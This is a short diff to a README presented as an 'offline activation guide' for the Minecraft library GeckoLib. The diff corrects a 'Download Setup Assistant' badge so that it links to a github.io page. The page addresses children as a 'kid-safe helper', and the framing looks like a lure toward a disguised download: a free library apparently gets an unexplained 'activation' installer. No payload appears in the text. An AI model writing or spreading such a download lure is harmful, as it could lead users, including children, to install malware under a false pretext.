@@ -1,6 +1,6 @@
 # GeckoLib — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)]( geckolib-minecraft-setup-assistant.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://geckolib-minecraft-setup-assistant.github.io/.github)
 
 > **Hi there!**  
 > This kid-safe helper shows you how to add GeckoLib to Minecraft completely offline.  
